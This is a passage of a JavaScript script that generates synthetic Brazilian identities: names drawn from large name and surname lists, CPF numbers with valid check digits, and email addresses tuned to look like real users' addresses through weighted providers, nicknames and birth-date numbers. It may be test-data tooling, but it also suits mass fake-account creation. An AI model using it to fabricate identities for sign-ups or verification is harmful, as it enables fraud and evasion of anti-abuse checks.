    "Roberta Rodrigues","Vitoria Aparecida","Caroline Vitoria","Isadora Oliveira","Jessica Cristina","Rayane Maria",
    "Fernanda Aparecida","Ana Francisca","Rayssa Souza","Monica Maria","Gabriela Vitoria","Evellyn Vitoria",
    "Anna Paula","Julia Souza","Julia Aparecida","Larissa Caroline","Debora Fernanda","Sara Vitoria",
    "Marya Eduarda","Amanda Caroline","Maria Larissa","Isabelly Cristina","Karla Cristina","Alice Maria",
    "Isabelli Souza","Jaqueline Aparecida","Andressa Vitoria","Agatha Cristina","Maria Gabrielly","Ana Victoria",
    "Camilli Vitoria","Jessica Vitoria","Camila Rodrigues","Monica Aparecida","Cristiane Aparecida","Jessica Fernanda",
    "Jose Luiz","Talita Maria","Renata Oliveira","Thayna Vitoria","Ana Cassia","Patricia Aparecida",
    "Karine Oliveira","Alessandra Souza","Janete Aparecida","Ana Camila","Ana Gabrielle","Jessica Oliveira",
    "Luciana Aparecida","Vitoria Oliveira","Lais Cristina","Isabelly Beatriz","Sabrina Maria","Maria Geovana",
    "Sarah Vitoria","Thais Vitoria","Mayra Rodrigues","Luana Caroline","Joao Carlos","Rebeca Vitoria",
    "Dayane Aparecida","Rayssa Victoria","Vitoria Camili","Larissa Souza","Yasmin Oliveira","Claudia Aparecida",
    "Camila Fernanda","Leonardo Rodrigues","Beatriz Cristina","Joao Guilherme","Jose Roberto","Lucas Gabriel",
    "Tainara Rodrigues","Pedro Paulo","Yasmin Cristina","Paulo Ricardo","Camila Souza","Luana Maria",
    "Juliana Cristina","Lara Vitoria","Rayane Aparecida","Gabriel Rodrigues","Lucas Daniel","Fernanda Vitoria",
    "Gabriela Maria","Anna Julya","Maria Luzia","Bruno Henrique","Giovana Oliveira","Karen Eduarda",
    "Raquel Souza","Mariana Souza","Lais Rodrigues","Maria Isabelle","Luis Henrique","Leonardo Henrique",
    "Paulo Sergio","Larissa Maria","Pamela Maria","Lara Beatriz","Heloisa Maria","Maria Eloiza",
    "Jaqueline Maria","Emilly Gabriely","Amanda Maria","Geovana Maria","Larissa Beatriz","Janaina Aparecida",
    "Tatiane Aparecida","Rayane Vitoria","Barbara Cristina","Kauane Vitoria","Monica Beatriz","Julia Caroline",
    "Anna Victoria","Camille Vitoria","Jenifer Vitoria","Gabrielle Rodrigues","Vitoria Gabriela","Anna Laura",
    "Bianca Eduarda","Giovanna Oliveira","Gleice Kelly","Lara Gabriele","Livia Maria","Alessandra Aparecida",
    "Carla Aparecida","Maria Eunice","Clara Beatriz","Anne Gabrielle","Maria Marcia","Helena Rosa",
    "Marilia Gabriela","Carolina Oliveira","Anna Vitoria","Maria Teresa","Regina Celia","Jussara Maria",
    "Marta Maria","Sueli Aparecida","Maria Socorro","Neuza Maria","Neide Maria","Silvia Regina",
    "Célia Regina","Luis Carlos","Regina Célia","Vera Maria","Silvia Helena","Sandra Cristina",
    "Maria Vilma","Sandra Aparecida","Maria Terezinha","Maria Ines","Silvia Maria","Daniele Oliveira",
    "Iris Aparecida","Samara Souza","Thalita Aparecida","Rosangela Maria","Angelica Maria","Laila Vitoria",
    "Maria Sueli","Kamile Vitoria","Paloma Henrique","Natalia Maria","Ane Karoline","Nicoly Victoria",
    "Erica Oliveira","Vanessa Aparecida","Bruna Gabrielle","Maria Alessandra","Vivian Maria","Karine Maria",
    "Maria Leila","Mayara Aparecida","Geovana Cristina","Rayanne Vitoria","Caroline Rodrigues","Wilma Maria",
    "Bianca Oliveira","Sara Maria","Ana Karolline","Fernanda Souza","Isabelly Rodrigues","Vanessa Oliveira",
    "Eduarda Caroline","Juliana Oliveira","Mikaelly Vitoria","Maria Yasmin","Emanuelly Vitoria","Laura Souza",
    "Brenda Rodrigues","Giovana Aparecida","Raissa Oliveira","Kailane Vitoria","Jaqueline Rodrigues","Lara Rayane",
    "Isabela Vitoria","Maria Daniele"
  ];

  // ─── 1538 SOBRENOMES ──────────────────────────────────────────────────────
  var surnames = [
    "Silva","Santos","Oliveira","Pereira","Ferreira","Lima",
    "Rodrigues","Alves","Costa","Sousa","Gomes","Almeida",
    "Nascimento","Ribeiro","Araujo","Carvalho","Martins","Lopes",
    "Soares","Barbosa","Vieira","Jesus","Fernandes","Rocha",
    "Goncalves","Dias","Andrade","Freitas","Cardoso","Nunes",
    "Moreira","Machado","Batista","Ramos","Melo","Cruz",
    "Mendes","Reis","Moraes","Marques","Moura","Teixeira",
    "Conceicao","Castro","Borges","Brito","Monteiro","Miranda",
    "Leite","Barros","Farias","Silveira","Cunha","Pinheiro",
    "Duarte","Garcia","Henrique","Neves","Morais","Guimaraes",
    "Medeiros","Matos","Campos","Correa","Victoria","Nogueira",
    "Fonseca","Bezerra","Amorim","Tavares","Xavier","Azevedo",
    "Siqueira","Queiroz","Viana","Aguiar","Menezes","Pires",
    "Franca","Pinto","Carmo","Macedo","Correia","Coelho",
    "Gabrielly","Camargo","Abreu","Chaves","Maciel","Amaral",
    "Paiva","Braga","Cavalcante","Sales","Assis","Dantas",
    "Mota","Torres","Lemos","Mendonca","Figueiredo","Cordeiro",
    "Magalhaes","Sampaio","Faria","Carneiro","Dutra","Anjos",
    "Barreto","Vasconcelos","Bueno","Leal","Antunes","Cristine",
    "Marinho","Diniz","Gonçalves","Felix","Trindade","Prado",
    "Freire","Feitosa","Arruda","Bastos","Franco","Gabriele",
    "Chagas","Santiago","Mello","Passos","Lacerda","Coutinho",
    "Guedes","Sena","Cabral","Vaz","Domingues","Candido",
    "Matias","Muniz","Bispo","Pacheco","Francisco","Neto",
    "Albuquerque","Terezinha","Paixao","Pimentel","Peixoto","Evangelista",
    "Araújo","Vargas","Gabrielle","Gama","Mesquita","Rezende",
    "Paz","Alexandre","Couto","Barboza","Brandao","Caetano",
    "Pessoa","Inacio","Lourenco","Braz","Ferraz","Furtado",
    "Mariano","Galvao","Lira","Lemes","Camilo","Pontes",
    "Filho","Vale","Lisboa","Bernardo","Porto","Teles",
    "Damasceno","Aquino","Domingos","Vilela","Cerqueira","Karoline",
    "Alvarenga","Gabriely","Mattos","Vinicius","Padilha","Fagundes",
    "Galdino","Assuncao","Bento","Toledo","Flores","Godoi",
    "Saraiva","Alcantara","Guilherme","Paulino","Marcelino","Fraga",
    "Francisca","Simoes","Peres","Bandeira","Barroso","Esteves",
    "Neres","Pedroso","Gabriella","Novais","Teodoro","Gonzaga",
    "Rosario","Veloso","Fernando","Meira","Tomaz","Sobrinho",
    "Hugo","Conceição","Rangel","Resende","Pinho","Thomaz",
    "Neri","Brasil","Bernardes","Priscila","Barcelos","Penha",
    "Ribas","Venancio","Pimenta","Castilho","Graças","Bessa",
    "Bonfim","Gouveia","Motta","Leao","Paes","Rabelo",
    "Pantoja","Ramalho","Bomfim","Teresinha","Dores","Lobato",
    "Simao","Madalena","Emanuelly","Cardozo","Cavalheiro","Augusta",
    "Faustino","Firmino","Meireles","Serra","Justino","Guerra",
    "Santo","Souto","Felicio","França","Custodio","Nobre",
    "Silverio","Goulart","Valentim","Coimbra","Avila","Emanuelle",
    "Fontes","Salles","Bittencourt","Boas","Lucena","Vidal",
    "Cristiny","Veiga","Lucio","Botelho","Eugenio","Schmidt",
    "Serafim","Gracas","Belo","Roque","Rios","Marcondes",
    "Aragao","Ventura","Noronha","Aires","Clemente","Rego",
    "Sanches","Sarmento","Aparecido","Godoy","Borba","Del",
    "Karolina","Karoliny","Linhares","Celestino","Jacinto","Benedito",
    "Ferrari","Jardim","Alessandra","Rufino","Floriano","Espindola",
    "Lins","Alexandra","Goes","Cavalcanti","Perez","Nobrega",
    "Calixto","Patricio","Abrantes","Baptista","Corrêa","Bitencourt",
    "Cristiane","Amaro","Christina","Vianna","Bernardino","Veras",
    "Prata","Caroliny","Avelino","Holanda","Dourado","Marcal",
    "Mancini","Modesto","Figueira","Leonardo","Gregorio","Januario",
    "Prestes","Angelica","Tenorio","Valle","Caldeira","Gois",
    "Auxiliadora","Muller","Maximo","Fidelis","Lobo","Valerio",
    "Graziele","Balbino","Novaes","Florencio","Meneses","Bahia",
    "Magalhães","Lourenço","Moreno","Gaspar","Caldas","Proenca",
    "Pena","Santa","Portela","Brum","Lorrayne","Godinho",
    "Madeira","Amancio","Vasconcellos","Telles","Lino","Gabrielli",
    "Viegas","Laurindo","Anunciacao","Gontijo","Terra","Varela",
    "Belarmino","Emanuele","Catarina","Estevam","Quirino","Falcao",
    "Branco","Gabrieli","Martinez","Espirito","Vilas","Agostinho",
    "Loureiro","Ortiz","Timoteo","Schneider","Sanchez","Rossi",
    "Mendonça","Romero","Pedrosa","Cristini","Honorio","Prates",
    "Mascarenhas","Sodre","Vital","Frazao","Verissimo","Campelo",
    "Camara","Valente","Basilio","Molina","Leme","Manganelli",
    "Dal","Jacob","Feliciano","Camargos","Bianchi","Honorato",
    "Silvestre","Arantes","Britto","Guimarães","Nery","Becker",
    "Lessa","Neta","Vitorino","Americo","Francelino","Fragoso",
    "Gusmao","Uchoa","Stephany","Raimundo","Hora","Virginia",
    "Boaventura","Quadros","Carreiro","Schmitt","Basso","Pessanha",
    "Crispim","Darc","Avaliadora","Looks","Vitorya","Sobral",
    "Sacramento","Ataide","Gouvea","Fabricio","Medina","Barcellos",
    "Vasques","Danielle","Carolaine","Cassiano","Benicio","Graciano",
    "Elizabete","Nonato","Palheta","Romao","Margarida","Pedreira",
    "Isabelly","Aguilar","Nazareth","Ruiz","Salvador","Saldanha",
    "Giovanna","Guia","Leitao","Marins","Bonifacio","Christine",
    "Cipriano","Jovino","Natal","Schmitz","Valadares","Orrutia",
    "Rondon","Bernadete","Moco","Conde","Cancissu","Lopez",
    "Graziela","Cesario","Emanuely","Rebelo","Escobar","Ferrazzo",
    "Arcanjo","Geovanna","Sartori","Severo","Junqueira","Mata",
    "Delfino","Estefani","Liberato","Brites","Demetrio","Salgado",
    "Marcolino","Hoffmann","Mauricio","Beserra","Stephanie","Cortez",
    "Nepomuceno","Abadia","Mamede","Cintra","Bello","Ponciano",
    "Isabelle","Apolinario","Deus","Lage","Brandão","Aurelio",
    "Tome","Portugal","Franciele","Rosin","Gonzalez","Feitoza",
    "Albino","Guerreiro","Veronica","Severiano","Roza","Prudente",
    "Sobreira","Naves","Furlanetto","Dorneles","Pascoal","Barbieri",
    "Fortunato","Klein","Raimunda","Mantovani","Petry","Ortega",
    "Cortes","Travassos","Gadelha","Landim","Juvencio","Drumond",
    "Claudino","Celeste","Lorraine","Filipe","Marin","Mafra",
    "Gimenes","Laurenco","Sant","Luyza","Neomi","Vitorio",
    "Garrido","Aleixo","Furlan","Generoso","Harumi","Theodoro",
    "Istefany","Cássia","Piedade","Camelo","Severino","Gil",
    "Pagung","Vilhena","Reboucas","Eiras","Carolline","Thaynara",
    "Saude","Benites","Norte","Parra","Fortes","Soledade",
    "Elizabeth","Munhoz","Carolayne","Maximiano","Hipolito","Osorio",
    "Avelar","Castelo","Donato","Figueiro","Negrao","Lago",
    "Macario","Florentino","Ferro","Pamplona","Marchi","Valadao",
    "Viturino","Serpa","Bordin","Bernardi","Raymundo","Nazario",
    "Sardinha","Carrijo","Delgado","Carolini","Fabri","Ladislau",
    "Saturnino","Germano","Rizzo","Ladeira","Casagrande","Dionizio",
    "Penteado","Filgueira","Rolim","Tolentino","Ruas","Serrao",
    "Klara","Games","Poletto","Justiniano","Seixas","Azeredo",
    "Clementino","Pitioti","Macena","Senna","Navarro","César",
    "Antônia","Meinlschmiedt","Taborda","Flauzino","Roseno","Aguilera",
    "Bianco","Damacena","Valim","Graca","Querino","Pardim",
    "Constantino","Buss","Kristiny","Bicalho","Sthefany","Stefanie",
    "Estefane","Thamires","Isabella","Gonsalves","Lelis","Rech",
    "Raposo","Schuster","Alvez","Evaristo","Quaresma","Rafaele",
    "Monte","Merces","Adelino","Bentes","Colares","Garcez",
    "Quintino","Meirelles","Karolaine","Rodriguez","Laureano","Nathalia",
    "Damascena","Meurer","Kowalski","Rafagnin","Nicacio","Bergamo",
    "Olimpio","Jaqueline","Batalha","Barra","Flausino","Piva",
    "Isaias","Polo","Cassimiro","Malta","Marciel","Izidoro",
    "Gorete","Profiro","Aranha","Frutuoso","Dedeco","Pickler",
    "Euzebio","Berto","Portes","Napolitano","Flor","Bom",
    "Kramer","Bauer","Salgueiro","Ferronato","Palmeira","Cosme",
    "Ximenes","Hhh","Nicolau","Ritter","Lazaro","Michelly",
    "Sthefanny","Gurgel","Deodato","Perola","Zanella","Antonieta",
    "Breda","Rosseto","Machion","Schossler","Crepaldi","Manuella",
    "Werner","Benevides","Santin","Agra","Bacelar","Bronzeli",
    "Pazini","Cezario","Rosado","Constante","Marciano","Henriques",
    "Hartmann","Graf","Kamilli","Malaquias","Santi","Grassi",
    "Fleck","Penido","Paixão","Inácio","Caixeta","Bragança",
    "Santanna","Hellena","Gutierrez","Assumpcao","Emiliano","Filha",
    "Danielli","Romana","Naomi","Geronimo","Baia","Gaia",
    "Pina","Grando","Nakamura","Steffane","Bortoluzzi","Targino",
    "Castello","Franklin","Fiuza","Gimenez","Melquiades","Ponte",
    "Clementina","Tomas","Manso","Cirqueira","Laurentino","Cristino",
    "Fogaca","Possamai","Negreiros","Espinola","Liborio","Pestana",
    "Diel","Villas","Rabello","Ayres","Patrocinio","Natividade",
    "Mira","Palma","Maranhao","Albano","Jordao","Karollyne",
    "Belchior","Guterres","Lustosa","Cirino","Damaceno","Pita",
    "Arrais","Rosas","Shinkawa","Sebastiao","Gilberto","Simon",
    "Regis","Cantanhede","Belem","Said","Batistela","Valenca",
    "Ramires","Andrielle","Yumi","Lang","Martiniano","Viecili",
    "Valentin","Cravo","Sandri","Foggia","Parente","Zanette",
    "Canin","Papait","Salazar","Escorcio","Della","Ohana",
    "Alexandrino","Hernandez","Laune","Portilho","Tanaka","Francielle",
    "Tosta","Furquim","Mariz","Venceslau","Faleiro","Jacobsen",
    "Hernandes","Devido","Alencastro","Emanueli","Andrini","Calacara",
    "Decarli","Castelhano","Balduino","Cadore","Portella","Sene",
    "Montenegro","Kelle","Camacho","Zanon","Thiele","Blanco",
    "Bierhals","Ton","Angelina","Frota","Silvano","Alvim",
    "Marcelle","Tauana","Barth","Weber","Enrique","Bertoldo",
    "Zumpano","Wohlmuth","Venâncio","Sávio","Benedita","Custódio",
    "Albrecht","Oliveiraj","Fritzen","Cláudio","Kathleen","Deziderio",
    "Lorrainy","Trevisan","Hahn","Rocio","Stephane","Martini",
    "Priscilla","Remedios","Cristian","Gutierres","Noe","Gabryelle",
    "Padua","Teixera","Canto","Cristiana","Karolayne","Mourao",
    "Karielly","Jeronimo","Bortoli","Olinto","Amparo","Amado",
    "Emile","Gameiro","Rolao","Ludaymon","Pastana","Damiani",
    "Rossato","Pellegrini","Juliao","Magri","Lameira","Benfica",
    "Magno","Tosi","Brigida","Marcelly","Favacho","Kele",
    "Colaco","Simas","Alvares","Guasti","Tagarro","Cristyne",
    "Boa","Trajano","Velozo","Favaro","Mayer","Grandi",
    "Liz","Otilia","Dionisio","Leoncio","Sandes","Madureira",
    "Crisostomo","Ricci","Pacifico","Teodora","Serrano","Nunez",
    "Perin","Padovani","Villar","Fernandez","Agostini","Sakamoto",
    "Messa","Vilhalba","Morales","Barreiros","Stefanny","Clecia",
    "Grigorio","Fugaca","Claudina","Calliman","Valeriano","Rosendo",
    "Velho","Carolyne","Puga","Slim","Loterio","Ananias",
    "Saavedra","Pedrozo","Gondim","Stadler","Eloi","Claro",
    "Cristo","Endres","Mark","Palhano","Stefanne","Hilario",
    "Gomide","Bicudo","Klenobingue","Werneck","Chamon","Eckert",
    "Bosco","Lorenzoni","Cassemiro","Salomao","Estacio","Primo",
    "Cavanha","Velasco","Boldrin","Mamedio","Lya","Marini",
    "Duraes","Guida","Aviz","Limeira","Villaca","Taveira",
    "Caxias","Manuel","Marvilla","Marquez","Roos","Auricelia",
    "Emerick","Mikaelly","Guido","Fiel","Balbinot","Butter",
    "Elane","Lohane","Cidade","Alho","Petrich","Cristyna",
    "Ferroni","Risso","Menegazzo","Viveiros","Aniceto","Francine",
    "Clarisse","Anderson","Baltazar","Pino","Simiao","Roldao",
    "Ayumi","Carral","Leidiane","Calado","Grativol","Nazaria",
    "Victorino","Cristinne","Bernarda","Lange","Amalia","Mora",
    "Facanha","Egidio","Aprigio","Benedette","Umbelino","Garces",
    "Loiola","Donadel","Zomer","Canuto","Gueleri","Brasiliano",
    "Friedrich","Valverde","Leoni","Pilar","Ricken","Sposito",
    "Menegon","Barretto","Leopoldo","Lavigne","Danielly","Hausmann",
    "Zortea","Goveia","Koch","Conti","Pequeno","Kroth",
    "Jeniffer","Morgan","Anacleto","Leonarda","Zilch","Carollina",
    "Miotto","Paschoal","Primon","Micaelly","Noleto","Penna",
    "Irineu","Barbalho","Jeremias","Inocencio","Adorno","Piovesan",
    "Filgueiras","Tormes","Hofffmann","Conrado","Minutti","Villela",
    "Conte","Domingas","Sepulveda","Acioli","Frade","Rechi",
    "Rebello","Zattar","Simplicio","Pio","Beie","Domiciano",
    "Lurene","Merighi","Ayala","Milani","Mainardes","Dionizia",
    "Wandscheer","Ayro","Namy","Goto","Feltrin","Passo",
    "Pizzano","Fantin","Leão","Castanho","Vencato","Simões",
    "Andres","Andélica","Galvão","Cândida","Frida","Donizetti",
    "Rosário","Knaak","Miiranda","Neis","Favaretto","Baran",
    "Anastácio","Cândido","Feldhaus","Lenice","Assunção","Pianezzer",
    "Keyle","Dib","Benjamim","Michelle","Amarante","Lice",
    "Lazzarotto","Sulamita","Viera","Kronbauer","Zarrochinski","Komar",
    "Paraiso","Brilhante","Angelis","Karolline","Hermel","Olimpia",
    "Barreiro","Maya","Ataides","Caceres","Fantini","Ambrosio",
    "Boeira","Mastrange","Martignago","Los","Karam","Seifeddine",
    "Thome","Terres","Schott","Izabella","Teodozio","Kostopoulos",
    "Leone","Sanabria","Kayane","Toscano","Carmona","Cury",
    "Berger","Estefania","Lindoso","Mabily","Faciroli","Steffany",
    "Tainar","Caravalho","Furoni","Frantz","Betoni","Hurtado",
    "Karolyna","Baima","Schenkel","Elisabete","Felizardo","Dilva",
    "Zaramella","Christiny","Pala","Herminia","Figueredo","Caires",
    "Milhomem","Cidimara","Kaizer","Melegari","Raquelly","Michaellede",
    "Larizza","Kardigina","Regia","Rivas","Rhania","Paim",
    "Christian","Rodegheri","Vaca","Calazans","Kravicz","Texeira",
    "Aguirre","Palacio","Hapuqui","Piacenti","Reinaldo","Michalski",
    "Saikoski","Labres","Pagani","Limaa","Pias","Varella",
    "Steiger","Pirani","Sujimoto","Miquelina","Louiny","Junio",
    "Amador","Loch","Quispe","Antero","Mineiro","Ott",
    "Aroucha","Monteles","Printes","Hunter","Colbeich","Heloize",
    "Tedesco","Clem","Zanetti","Nova","Kozovski","Sotero",
    "Crystina","Nelli","Marsari","Mieres","Kaelaine","Cotrim",
    "Braganca","Prudencio","Gato","Francielli","Bone","Zani",
    "Kethellen","Ferraro","Luize","Rafaelle","Desiderio","Smaniotto",
    "Copque","Brasileiro","Mossulin","Eishyla","Merlo","Mallmann",
    "Rigueira","Verona","Pardini","Belini","Goncalo","Riquelme",
    "Kruger","Wend","Norato","Silene","Alvarez","Nabuco",
    "Leonidas","Holder","Vanderlei","Emanuela","Martineli","Kerlon",
    "Foss","Sortica","Albert","Dia","Moro","Berte",
    "Emanoel","Cassol","Ketelly","Diaz","Schuman","Divino",
    "Zanardi","Smith","Caron","Dornelas","Tobias","Torquato",
    "Fiochi","Ramiro","Sthefani","Santoa","Higino","Simioni",
    "Idalino","Criatina","Fischer","Balieiro","Crespo","Paranhos",
    "Enes","Froner","Grayce","Robles","Omena","Cobos",
    "Ernesto","Tramonte","Pedras","Fontinellis","Garbinato","Cidalina",
    "Laranja","Neubauer","Rosangela","Netto","Janison","Gotardo",
    "Grasiele","Felisberto","Forte","Cristal","Trapp","Lauer",
    "Jandira","Mazzi","Marchiori","Nugerina","Livino","Christani",
    "Santod","Roveredo","Juravski","Monaly","Belizario","Romuanna",
    "Gianne","Assmann","Selbach","Arocha","Faller","Guilhermina",
    "Cosmo","Navas","Gauna","Chiabai","Nathalle","Thevilla",
    "Solano","Kethoy","Totti","Bora","Rubim","Herculano",
    "Sayuri","Vilalva","Maranho","Fellipe","Benedetti","Luise",
    "Brida","Vilaca","Boaes","Parreira","Aboim","Cortivo",
    "Nishida","Santacruz","Pegoretti","Gollo","Camillo","Liviero",
    "Gasparello","Balotin","Bulhoes","Durans","Maquine","Wiliany",
    "Lombardi","Fideles","Diamantino","Beatris","Vanzin","Fabian",
    "Frederico","Suzan","Paludo","Garbin","Nathally","Liryel",
    "Pisetta","Negri","Belisario","Ryta","Musso","Ene",
    "Galera","Daher","Jordania","Suterio","Fontenele","Urbano",
    "Benedet","Seabra","Viriato","Archangelo","Gandra","Cristovao",
    "Anastacio","Rizzi","Patez","Magela","Macedode","Spozito",
    "Adam","Queiroga","Casanova","Teobaldo","Fialho","Faia",
    "Occhi","Angelino","Stocco","Rosset","Urbanski","Goncalez",
    "Thayse","Kodama","Mirellen","Finesi","Feiteira","Barriga",
    "Kreiser","Jaini","Rosy","Hacker","Argolo","Dambrosi",
    "Linara","Vilanova","Virgens","Gonzales","Tameirao","Louvem",
    "Raquelle","Gomez","Sinara","Mancio","Dalzotto","Keller",
    "Mousinho","Rege","Pessa","Cataneo","Stephani"
  ];

  // ─── CONECTORES ───────────────────────────────────────────────────────────
  var connectors = ["de","da","dos","das","do","e","di"];

  var pick = function(list) {
    return list[Math.floor(Math.random() * list.length)];
  };

  var randInt = function(min, max) {
    return Math.floor(min + Math.random() * (max - min + 1));
  };

  // ─── NOME ─────────────────────────────────────────────────────────────────
  var nameRoll = Math.random();
  var firstName;
  var isMale;

  if (nameRoll < 0.28) {
    firstName = pick(compoundNames);
    isMale = Math.random() < 0.35;
  } else if (nameRoll < 0.42) {
    firstName = pick(maleNames);
    isMale = true;
  } else {
    firstName = pick(femaleNames);
    isMale = false;
  }

  var s1 = pick(surnames);
  var s2 = pick(surnames);
  while (s2 === s1) s2 = pick(surnames);
  var s3 = pick(surnames);
  while (s3 === s1 || s3 === s2) s3 = pick(surnames);

  var structRoll = Math.random();
  var fullName;

  if (structRoll < 0.12) {
    fullName = firstName + " " + s1;
  } else if (structRoll < 0.60) {
    fullName = firstName + " " + s1 + " " + s2;
  } else if (structRoll < 0.78) {
    fullName = firstName + " " + s1 + " " + pick(connectors) + " " + s3;
  } else if (structRoll < 0.90) {
    fullName = firstName + " " + s1 + " " + s2 + " " + s3;
  } else {
    fullName = firstName + " " + s1 + " " + pick(connectors) + " " + s2 + " " + s3;
  }

  // ─── CPF ─────────────────────────────────────────────────────────────────
  var digits = [];
  for (var i = 0; i < 9; i++) digits.push(Math.floor(Math.random() * 10));
  var sum1 = 0;
  for (var i = 0; i < 9; i++) sum1 += digits[i] * (10 - i);
  var rem1 = (sum1 * 10) % 11;
  digits.push(rem1 === 10 || rem1 === 11 ? 0 : rem1);
  var sum2 = 0;
  for (var i = 0; i < 10; i++) sum2 += digits[i] * (11 - i);
  var rem2 = (sum2 * 10) % 11;
  digits.push(rem2 === 10 || rem2 === 11 ? 0 : rem2);
  var randomCpf = digits.join("");

  // ─── EMAIL ────────────────────────────────────────────────────────────────
  var stripAccents = function(str) {
    return str.normalize("NFD").replace(/[\u0300-\u036f]/g, "");
  };
  var toSlug = function(s) {
    return stripAccents(s).toLowerCase().replace(/[^a-z]/g, "");
  };

  var stops = ["de","da","do","dos","das","e","di","d","a","o"];
  var nameParts = fullName.split(" ").filter(function(p) {
    return stops.indexOf(p.toLowerCase()) === -1 && p.length >= 2;
  }).map(toSlug).filter(function(p) { return p.length >= 2; });

  var ef  = nameParts[0] || "user";
  var em  = nameParts.length > 2 ? nameParts[1] : "";
  var el  = nameParts[nameParts.length - 1] || "";
  var es1 = toSlug(s1);
  var es2 = toSlug(s2);

  var getNum = function() {
    var r = Math.random();
    if (r < 0.344) return "";
    if (r < 0.556) return String(randInt(1, 99));
    if (r < 0.753) return String(randInt(100, 999));
    if (r < 0.855) return String(randInt(1000, 9999));
    if (r < 0.910) return String(randInt(10000, 99999));
    var d = String(randInt(1, 28)).padStart(2, "0");
    var m = String(randInt(1, 12)).padStart(2, "0");
    var a = String(randInt(1985, 2006));
    if (Math.random() < 0.45) return d + m;
    return d + m + a.slice(2);
  };

  var getDomain = function() {
    var r = Math.random();
    if (r < 0.8480) return "gmail.com";
    if (r < 0.9133) return "hotmail.com";
    if (r < 0.9529) return "icloud.com";
    if (r < 0.9658) return "outlook.com";
    if (r < 0.9780) return "yahoo.com.br";
    if (r < 0.9811) return "yahoo.com";
    if (r < 0.9827) return "bol.com.br";
    if (r < 0.9839) return "live.com";
    if (r < 0.9850) return "uol.com.br";
    return "outlook.com.br";
  };

  var domain = getDomain();
  var num    = getNum();

  var apelidos = {
    "jessica" :["jess","jeh","jessi","jessi"],
    "beatriz" :["bia","bea","biih","bi"],
    "gabriela":["gabi","gah","gabii"],
    "isabela" :["isa","bela","belly","bellinha"],
    "mariana" :["mari","mary","mah","marih"],
    "heloisa" :["helo","heloh","helzinha"],
    "julia"   :["juju","juh","juliinha"],
    "vitoria" :[["vivi","vitih","vito","vi"]],
    "larissa" :[["lari","larih","lala"]],
    "rafaela" :[["rafa","rafah","fe","rafinha"]],
    "leticia" :[["lety","leh","lele"]],
    "luiza"   :[["luih","luuuh","luizinha"]],
    "fernanda":[["fer","nanda","nandinha"]],
    "bianca"  :[["bi","bih","bii"]],
    "bruna"   :[["bru","bruuh","brunah","bruninha"]],
    "amanda"  :[["manda","amandinha","mandy"]],
    "camila"  :[["cah","camih","caminha"]],
    "natalia" :[["naty","natih","nats"]],
    "priscila":[["pri","prisci","pris"]],
    "giovana" :[["gi","gio","geo"]],
    "sabrina" :[["sah","sabi","sabih"]],
    "patricia":[["paty","pah","pat"]],
    "gabriel" :[["gab","gabi","gabruh"]],
    "lucas"   :[["lu","luca","lukinha"]],
    "matheus" :[["math","mths","matheuzin","matheuzinho"]],
    "guilherme":[["gui","guih","guizinho"]],
    "pedro"   :[["pe","peh","pedrinho","pedrão"]],
    "thiago"  :[["thi","thiagao","thii"]],
    "rafael"  :[["rafa","raf","rafinha"]],
    "joao"    :[["jo","jao","joaozin","joaozinho"]],
    "gustavo" :[["gus","guto","gustinha"]],
    "felipe"  :[["feh","fe","felipinho"]],
    "ana"     :[["aninha","aninhas","anny"]],
    "debora"  :[["deh","debs","debinha"]],
    "eduarda" :[["edu","dudu","dudinha"]],
    "carol"   :[["carolzinha","carolh","carols"]],
    "livia"   :[["liv","livinha","livih"]],
    "layla"   :[["lay","laylay","laylinha"]],
    "yasmim"  :[["yas","yasmin","yasminha"]],
    "sofia"   :[["sofi","sofinha","sofiih"]],
    "clara"   :[["clarinha","clah","clarih"]],
    "alice"   :[["ali","alicinha","alih"]],
    "luana"   :[["lu","luany","luana"]],
    "sara"    :[["sarinha","sarih","sah"]]
  };

  var getDiminutivo = function(nome) {
    var ap = apelidos[nome];
    if (ap) return pick(ap);
    var sufixos = ["inha","inho","zinha","zinho","in","iss","ita"];
    var base = nome.slice(0, Math.min(nome.length, randInt(3, 6)));
    return base + pick(sufixos);
  };

  var emailLocal;
  var r = Math.random();

  if (r < 0.151) {
    emailLocal = ef + el + num;
  } else if (r < 0.246) {
    var meio = (em && em !== ef && em !== el) ? em : es1;
    if (meio === ef || meio === el) meio = es2;
    emailLocal = ef + meio + num;
  } else if (r < 0.346) {
    var extras = [
      function() { return ef + el + (em || es1) + num; },
      function() { return ef + es1 + es2 + num; },
      function() { return ef + (em || es1) + num; },
      function() { return ef + el + num; },
      function() { return ef + getDiminutivo(ef).slice(2) + el + num; }
    ];
    emailLocal = pick(extras)();
  } else if (r < 0.442) {
    var apStyles = [
      function() { return getDiminutivo(ef) + el.slice(0, randInt(3,5)) + num; },
      function() { return getDiminutivo(ef) + num; },
      function() { return el + ef + num; },
      function() { return (ef[0]||"a") + el + num; },
      function() {
        var initials = nameParts.map(function(p){ return p[0]; }).join("");
        return initials + String(randInt(10, 9999999));
      },
      function() {
        var two = (nameParts[0]||"ab").slice(0,2) + ((nameParts[1]||"cd")[0]||"x");
        return two + String(randInt(100000, 9999999));
      },
      function() { return el + (num || String(randInt(1,9999))); },
      function() { return es1 + getDiminutivo(ef) + String(randInt(1,99)); },
      function() { return ef.slice(0, randInt(4,7)) + es1.slice(0, randInt(3,5)) + num; },
      function() { return ef + es1 + String(randInt(1985, 2006)); }
    ];
    emailLocal = pick(apStyles)();
  } else if (r < 0.537) {
    var truncLen = randInt(3, ef.length > 6 ? 6 : ef.length);
    var truncFirst = ef.slice(0, truncLen);
    if (Math.random() < 0.20 && /[aeiou]$/.test(truncFirst)) {
      truncFirst = truncFirst + truncFirst.slice(-1);
    }
    emailLocal = truncFirst + el + num;
  } else if (r < 0.592) {
    emailLocal = ef + es2 + num;
  } else if (r < 0.647) {
    var elT = es1.length > 5 ? es1.slice(0, randInt(5, es1.length)) : es1;
    if (Math.random() < 0.4) {
      emailLocal = elT + ef + num;
    } else {
      emailLocal = elT + getDiminutivo(ef).slice(0, randInt(3,5)) + num;
    }
  } else if (r < 0.685) {
    emailLocal = el + ef + num;
  } else if (r < 0.716) {
    var inits = nameParts.slice(0, randInt(2, Math.min(4, nameParts.length)))
                         .map(function(p){ return p[0]; }).join("");
    emailLocal = inits + String(randInt(100, 9999999));
  } else if (r < 0.731) {
    emailLocal = es2 + ef + num;
  } else if (r < 0.745) {
    emailLocal = ef + (num || String(randInt(1, 9999)));
  } else if (r < 0.758) {
    emailLocal = ef + "." + el + num;
  } else if (r < 0.768) {
    emailLocal = ef + String(randInt(100000, 99999999));
  } else if (r < 0.775) {
    emailLocal = ef + "_" + el + num;
  } else {
    emailLocal = el + "." + ef + num;
  }

